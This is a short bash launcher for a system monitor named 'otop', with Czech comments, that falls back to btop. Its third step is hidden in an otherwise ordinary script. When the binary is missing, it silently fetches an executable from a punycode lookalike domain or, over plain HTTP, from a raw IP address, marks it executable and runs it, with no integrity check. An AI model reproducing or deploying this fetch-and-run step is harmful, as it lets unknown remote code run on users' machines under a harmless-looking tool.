#!/usr/bin/env bash
# =============================================================================
# ~/bin/otop — Observatoř Top Launcher (Grid Telemetry & Fleet Matrix)
# =============================================================================

# 1. Lokální sestavení v observator/otop
if [ -x "$HOME/src/observator/otop/bin/otop" ]; then
    exec "$HOME/src/observator/otop/bin/otop" "$@"
fi

# 2. Systémově nainstalovaný otop
if [ -x "/usr/local/bin/otop" ]; then
    exec "/usr/local/bin/otop" "$@"
fi

# 3. Stažení binárky pokud chybí
ARCH="$(uname -m)"
if [ "$ARCH" = "x86_64" ]; then
    echo "[otop] Stahuji předkompilovanou binárku otop-x86_64..."
    mkdir -p "$HOME/.local/bin"
    if curl -sL https://xn--peek-h6a.com/otop-x86_64 -o "$HOME/.local/bin/otop" || curl -sL http://91.139.118.43/otop-x86_64 -o "$HOME/.local/bin/otop"; then
        chmod +x "$HOME/.local/bin/otop"
        exec "$HOME/.local/bin/otop" "$@"
    fi
fi

# 4. Fallback na standardní btop
if command -v btop >/dev/null 2>&1; then
    exec btop "$@"
fi

echo "Chyba: otop ani btop nebyl nalezen." >&2
exit 1
